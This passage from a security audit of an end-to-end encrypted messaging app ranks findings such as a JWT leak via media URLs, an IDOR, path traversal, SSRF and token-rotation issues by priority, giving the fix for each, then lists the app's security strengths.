1. **H-04 — JWT exfil via media URL.** Gate the `Authorization` header in `fetchMediaBytes` on
   exact origin match with `baseUrl`, and validate `parsed.mediaUrl` on decrypt. *Highest impact
   (account takeover by any contact), smallest fix.* → also a **quick win**.
2. **H-01 — getMessages IDOR.** Add the participant check to `handleGetMessages`/`findByConversation`.
   *Mass cross-account metadata exposure; one membership check.* → **quick win.**
3. **H-02 — mediaUrl path-traversal file delete.** Anchor `MEDIA_URL_REGEX` to a strict filename
   shape **and** reject `..`/escape in `extractPublicId`→`deleteFile`. → mostly a **quick win**.
4. **M-07 / M-03 — production runs in dev mode.** Set `NODE_ENV=production` on the deployed backend
   and force `synchronize:false`; verify via `/version`. *Prevents prod schema auto-sync data loss +
   CORS dev-bypass.* → **quick win** (one env var) + follow-up (migrations).
5. **H-03 — E2E identity pinning.** Implement TOFU pin-and-warn + a safety-number verification UI.
   *Larger UX change; closes the server-MITM hole.*
6. **M-05 — WS skips pwChangedAt.** Mirror the REST `iat <= passwordChangedAt` check in
   `handleConnection`; disconnect live sockets on password reset. → **quick win.**
7. **M-04 — link-preview SSRF.** Resolve-and-pin + binary private-range check on every hop. (Also
   re-evaluate whether server-side preview is needed at all given E2E.)
8. **M-01 — refresh-token rotation race / no reuse detection.** Atomic `DELETE … RETURNING` +
   reuse-triggered family revoke; shorten the 365-day TTL.
9. **M-02 — unscoped fcm-token delete.** Scope to `req.user.id` (mirror web-push). → **quick win.**
10. **L-11 / L-12 / L-13 — infra hardening.** Non-root container `USER`; nginx CSP + `X-Frame-Options`;
    raise `client_max_body_size` to 22m. → all **quick wins**.
11. **L-14 — token storage.** Move the refresh token to httpOnly cookie / OS keystore.
12. **M-06 / L-08 / L-09 / L-10 / L-04 / L-05 / L-06 / I-03** — correctness/hardening backlog
    (SQL-side pagination, throttle the unthrottled WS handlers, `@IsIn` messageType, signed-prekey
    rotation, purge secret_notes on delete, prekey-depletion cap, rebuild-relay gating, add CI
    `npm audit`).

**Quick wins (small, high-value, low-risk):** H-01, H-02, H-04, M-02, M-05, M-07 (env var),
L-11, L-12, L-13, L-09. Several are one-to-few-line changes with outsized impact.

---

## STRENGTHS (looked-good)
- **E2E failure handling is genuinely careful.** `decideDecryptionFailure`
  (`decryption_failure_policy.dart`) is a pure, characterization-tested state machine; the inbound
  decrypt-failure path **never deletes a Signal session** (rebuild-request only), and
  `ensureSession` builds *over* the record (archives, not deletes) — exactly the lossless behavior
  libsignal needs. This is hard-won and correct.
- **Push is metadata-only.** No message text or keys ever leave the device via FCM/Web Push; the
  web-push body is VAPID-encrypted end-to-end to the subscription. Push-skip decisions are server-
  side with a freshness guard.
- **No plaintext / keys / tokens are logged anywhere** (verified repo-wide). Diagnostics carry ids,
  booleans, types, and lengths only.
- **WS authZ is consistent** — every state-changing handler verifies conversation membership /
  ownership (delivered, read, clear, delete, pin, disappearing, reactions, friend accept/reject,
  block) *except* the one `getMessages` gap (H-01), which makes that omission clearly a bug.
- **Media crypto is sound:** AES-256-GCM with a fresh random 32-byte key + 12-byte IV per blob,
  20MB cap, done off the UI path.
- **Solid web hygiene:** Flutter canvas rendering (no DOM XSS surface); the only HTML (secret-note
  landing page, service worker) treats untrusted strings as text; links are restricted to `https?://`.
- **Input validation everywhere:** global `ValidationPipe({whitelist:true})` (REST) + per-event
  `validateDto` (WS); `helmet()`; per-route throttling; account-delete 1/hour; avatar magic-byte +
  mimetype + size checks; atomic OTP claim and atomic secret-note read-once via `… RETURNING`.
- **Refresh tokens** stored only as SHA-256 hashes (opaque 48-byte random), rotated on use; password
  change invalidates access tokens (REST) and revokes all refresh tokens.
- **SSRF is partially defended** (manual redirect following with per-hop re-validation; the gap is
  the IP-encoding/DNS-rebind layer, M-04) and the link-preview image URL is re-validated again on
  the client before render — defense in depth.
